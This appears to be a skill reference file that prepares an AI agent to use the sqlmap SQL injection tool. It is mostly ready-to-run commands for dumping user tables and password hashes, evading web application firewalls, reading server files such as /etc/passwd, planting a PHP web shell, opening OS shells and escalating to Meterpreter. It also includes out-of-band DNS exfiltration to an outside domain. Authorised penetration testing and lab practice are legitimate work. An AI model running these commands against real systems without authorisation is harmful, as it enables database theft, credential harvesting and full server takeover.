---
name: sqlmap
description: "Auth/lab ref: automated SQL injection detection and exploitation tool. For testing web applications for SQLi vulnerabilities to enumerate databases, extract data, read/write files, or escalate to OS shell."
license: GPL-2.0
compatibility: "Linux / macOS / Windows; Python 3.x."
metadata:
  author: AeonDave
  version: "1.1"
---

# sqlmap

Automated SQL injection detection and exploitation.

## Quick Start

```bash
# Test GET parameter
sqlmap -u "http://target.com/item?id=1"

# Test POST request (from Burp)
sqlmap -r request.txt --batch

# Test with cookies
sqlmap -u "http://target.com/page" --cookie="session=abc123" --data="id=1"
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u <url>` | Target URL with parameter(s) |
| `-r <file>` | Load HTTP request from file (Burp capture) |
| `-m <file>` | Test multiple targets from file |
| `--data <data>` | POST data string |
| `--forms` | Parse and test forms from the target page |
| `--cookie <str>` | Cookie string |
| `-p <param>` | Test specific parameter |
| `--dbms <type>` | Force backend DBMS (mysql/mssql/postgres/oracle) |
| `--level <1-5>` | Test depth (default 1; 5 = headers, referer) |
| `--risk <1-3>` | Payload risk (default 1; 3 = heavy UPDATE/DELETE payloads) |
| `--technique <T>` | Injection techniques: B E U S T Q (see below) |
| `--threads <n>` | Concurrent requests (default 1) |
| `--delay <n>` | Delay between requests |
| `--timeout <n>` | Request timeout |
| `--retries <n>` | Retry failed requests |
| `--proxy <url>` | HTTP/SOCKS5 proxy |
| `--ignore-proxy` | Ignore configured proxy settings |
| `--tor` | Use Tor (requires tor + proxychains) |
| `--batch` | Never ask for user input (auto yes) |
| `--random-agent` | Use random User-Agent |
| `--headers <str>` | Extra HTTP headers |
| `--auth-type <type>` | Basic/Digest/NTLM/PKI |
| `--auth-cred <u:p>` | Auth credentials |
| `--ignore-redirects` | Don't follow redirects |
| `--flush-session` | Clear cached scan state for retesting |
| `-v <0-6>` | Verbosity level |

## Level vs Risk (Critical Distinction)

**`--level` (1-5)** — *where* to inject:
- 1: GET/POST params only
- 2: + Cookie values
- 3: + User-Agent and Referer headers
- 5: + Host and all other locations

**`--risk` (1-3)** — *how dangerous* the payloads are:
- 1: Safe (boolean, UNION, error-based)
- 2: + Heavy time-based blind queries
- 3: + OR-based (can modify data — dangerous on production)

| Scenario | Flags |
|----------|-------|
| CTF / test lab | `--level=5 --risk=3 --batch` |
| Production pentest | `--level=2 --risk=1` |
| Known injectable param | `--level=1 --risk=1 --technique=U` |
| Test headers too | `--level=3 --risk=2` |

## Injection Techniques

| Code | Technique | Speed | Notes |
|------|-----------|-------|-------|
| `B` | Boolean-based blind | Medium | High request count, reliable |
| `E` | Error-based | Fast | Only when DB errors visible |
| `U` | UNION query | Fast | Fastest when applicable |
| `S` | Stacked queries | Variable | Needs multi-statement support |
| `T` | Time-based blind | Slow | Last resort |
| `Q` | Out-of-band (DNS) | Variable | Requires `--dns-domain` |

```bash
# Force error-based + union only (faster)
sqlmap -u "http://target.com/page?id=1" --technique=EU

# Time-based only (when others fail)
sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=3

# Out-of-band via DNS (when WAF blocks HTTP responses)
sqlmap -r req.txt --technique=Q --dns-domain=your.burpcollaborator.net --dbs
```

## Enumeration Commands

```bash
# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Enumerate columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --columns

# Dump a table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C "username,password" --dump

# Dump all databases (use carefully)
sqlmap -u "http://target.com/page?id=1" --dump-all --exclude-sysdbs

# Current DB/User/Hostname
sqlmap -u "http://target.com/page?id=1" --current-db --current-user --hostname

# Check for DBA privileges
sqlmap -u "http://target.com/page?id=1" --is-dba

# List users + password hashes
sqlmap -u "http://target.com/page?id=1" --users --passwords
```

## WAF Bypass (Tamper Scripts)

```bash
# List all tamper scripts
sqlmap --list-tampers

# Apply tamper script
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Stack multiple tampers
sqlmap -u "http://target.com/page?id=1" \
    --tamper="space2comment,between,randomcase"
```

| Tamper | Effect |
|--------|--------|
| `space2comment` | Replace spaces with `/**/` |
| `between` | Replace `>` with `NOT BETWEEN 0 AND` |
| `randomcase` | Random case on keywords (SeLeCt) |
| `charencode` | URL-encode characters |
| `charunicodeencode` | Unicode-encode characters |
| `base64encode` | Base64-encode payload |
| `equaltolike` | Replace `=` with `LIKE` |
| `greatest` | Replace `>` with `GREATEST()` |
| `hexencode` | Hex-encode strings |
| `modsecurityversioned` | Commented versioned MySQL queries |
| `percentage` | Insert `%` between characters (IIS) |
| `versionedkeywords` | Versioned MySQL comments around keywords |
| `apostrophemask` | Replace `'` with UTF-8 fullwidth apostrophe |
| `bluecoat` | Replace space with random whitespace after SQL keyword |

## File Read / Write

```bash
# Read server file (requires FILE privilege on MySQL)
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page?id=1" --file-read="C:/Windows/win.ini"

# Write file to server (requires writable webroot)
sqlmap -u "http://target.com/page?id=1" \
    --file-write="shell.php" \
    --file-dest="/var/www/html/shell.php"
```

## OS Interaction (Escalation)

```bash
# Interactive OS shell (via stacked queries / LOAD_FILE / xp_cmdshell)
sqlmap -u "http://target.com/page?id=1" --os-shell

# OS command execution (single command)
sqlmap -u "http://target.com/page?id=1" --os-cmd="id"

# SQL shell (raw SQL queries)
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Meterpreter / Cobalt Strike shell via OS shell
# (--os-pwn: requires Metasploit)
sqlmap -u "http://target.com/page?id=1" --os-pwn
```

## Common Workflows

```bash
# From Burp capture (most reliable):
# Right-click request → Save → request.txt
sqlmap -r request.txt --batch --level=3 --risk=2 --dbs

# Agent-safe conservative baseline for a known parameter
sqlmap -u "http://target.com/item?id=1" -p id --batch --level=2 --risk=1 --threads=5 --timeout=10 --retries=1 --random-agent

# POST form:
sqlmap -u "http://target.com/login" \
    --data="username=admin&password=test" \
    -p username --batch --dbs

# Cookie injection:
sqlmap -u "http://target.com/dashboard" \
    --cookie="user_id=5; session=abc" \
    -p user_id --batch

# JSON body:
sqlmap -u "http://target.com/api/search" \
    --data='{"id": "1"}' \
    --headers="Content-Type: application/json" \
    -p id --batch

# Header injection (User-Agent, Referer, X-Forwarded-For):
sqlmap -u "http://target.com/page" \
    --level=3 --batch
    # level 3+ automatically tests headers

# Through Burp proxy (for traffic review):
sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --batch

# Second-order injection:
sqlmap -u "http://target.com/register" \
    --data="username=INJECTHERE&email=x@x.com" \
    --second-url="http://target.com/profile" \
    --second-req=profile_request.txt
```

## Advanced Injection

```bash
# CSRF token bypass (auto re-fetch token before each request)
sqlmap -r req.txt --csrf-token="csrf_token" --csrf-url="http://target.com/login"

# Dynamic parameter via Python eval (compute token per request)
sqlmap -r req.txt --eval="import hashlib; token=hashlib.md5(id.encode()).hexdigest()"

# Crawl site for forms automatically
sqlmap -u "http://target.com/" --crawl=3 --forms --batch

# Direct DB connection (no HTTP layer needed)
sqlmap -d "mysql://root:password@192.168.1.100/testdb" --dump-all

# REST URL with injection point marked
sqlmap -u "http://target.com/users/1*/profile" --batch

# Inject in headers explicitly
sqlmap -r req.txt --headers="X-Forwarded-For: 127.0.0.1*"
```

## Speed Optimization

```bash
# Faster scan (increase threads, use UNION/error first)
sqlmap -r request.txt --batch \
    --dbms=mysql \
    --technique=EU \
    --threads=10 \
    --level=1 --risk=1

# Enable all optimizations at once
sqlmap -r request.txt -o --batch

# Skip slow time-based if others available
sqlmap -r request.txt --batch --technique=EUS

# Reduce wait time for time-based
sqlmap -r request.txt --time-sec=2

# Skip heuristics, only test known technique
sqlmap -r request.txt --test-filter="MySQL UNION"

# Run thorough tests only when heuristics positive
sqlmap -r request.txt --smart

# Speed up blind using predicted common outputs
sqlmap -r request.txt --predict-output
```

## Cleanup

```bash
# Purge all session/output data
sqlmap --purge

# Force fresh scan (ignore cached session)
sqlmap -r req.txt --fresh-queries

# Flush session for specific target
sqlmap -r req.txt --flush-session
```

## Resources

| File | When to load |
|------|--------------|
| `references/tamper-guide.md` | Tamper scripts reference, WAF bypass strategies, advanced injection |
